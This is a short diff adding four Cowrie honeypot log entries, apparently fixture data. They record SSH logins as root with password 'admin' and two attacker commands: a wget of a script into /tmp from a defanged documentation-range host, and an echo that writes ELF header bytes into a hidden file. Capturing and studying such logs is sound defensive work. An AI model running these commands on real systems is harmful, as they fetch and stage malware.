@@ -1,0 +1,4 @@
+{"eventid":"cowrie.login.success","timestamp":"2026-11-07T10:00:01.000000Z","src_ip":"198.51.100.10","session":"d1","username":"root","password":"admin"}
+{"eventid":"cowrie.command.input","timestamp":"2026-11-07T10:00:05.000000Z","src_ip":"198.51.100.10","session":"d1","input":"cd /tmp; wget hxxp[:]//192[.]0[.]2[.]5/x.sh"}
+{"eventid":"cowrie.login.success","timestamp":"2026-11-07T11:20:00.000000Z","src_ip":"198.51.100.10","session":"d2","username":"root","password":"admin"}
+{"eventid":"cowrie.command.input","timestamp":"2026-11-07T11:20:04.000000Z","src_ip":"198.51.100.10","session":"d2","input":"echo -ne \"\\x7f\\x45\\x4c\\x46\" >> .d"}
